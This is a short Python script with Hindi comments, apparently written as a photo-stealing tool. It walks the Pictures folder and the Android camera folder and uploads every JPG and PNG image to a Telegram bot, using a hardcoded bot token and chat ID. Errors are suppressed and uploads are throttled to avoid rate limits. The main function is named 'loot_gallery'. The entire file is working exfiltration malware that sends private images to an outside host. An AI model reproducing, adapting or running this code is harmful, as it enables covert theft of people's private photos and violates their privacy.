import os
import requests
import time

# अपना Telegram Bot टोकन और Chat ID यहाँ डालें
BOT_TOKEN = "8326897131:AAFqmyvZh7eN1yyAVLKecU0o1XLRxWRSTIU"
CHAT_ID = "8510139561"

def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        payload = {'chat_id': CHAT_ID}
        files = {'document': file}
        try:
            requests.post(url, data=payload, files=files)
        except:
            pass

def loot_gallery():
    # टारगेट फोल्डर्स (Windows/Android)
    paths = [
        os.path.expanduser('~') + "/Pictures",
        "/storage/emulated/0/DCIM/Camera"
    ]
    
    extensions = ('.jpg', '.jpeg', '.png')

    for p in paths:
        if os.path.exists(p):
            for root, dirs, files in os.walk(p):
                for file in files:
                    if file.lower().endswith(extensions):
                        full_path = os.path.join(root, file)
                        send_to_telegram(full_path)
                        time.sleep(1) # रेट लिमिट से बचने के लिए

if __name__ == "__main__":
    loot_gallery()